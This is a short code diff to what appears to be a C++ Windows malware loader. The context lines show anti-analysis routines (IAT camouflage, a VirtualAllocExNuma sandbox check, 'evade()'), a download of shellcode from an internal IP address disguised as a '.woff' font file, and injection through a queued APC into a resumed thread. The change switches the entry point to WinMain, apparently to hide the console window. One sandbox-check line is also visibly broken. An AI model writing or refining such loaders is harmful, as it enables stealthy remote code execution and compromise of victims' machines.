@@ -106,8 +106,6 @@ VOID ModifiedIatCamouflage() {
     HeapFree(GetProcessHeap(), 0, pAddress);
 }
 
-
-
 BOOL CheckVirtualAllocExNuma(){
     LPVOID mem = (LPVOID)(GetCurrentProcess(), NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
     if (mem == NULL) {
@@ -178,7 +176,7 @@ void evade() {
     }
 };
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     evade();
 	std::vector<BYTE> payload;
 	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
@@ -210,4 +208,6 @@ int main() {
     pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     
     ResumeThread(threadHandle);
+
+    return 0;
 }
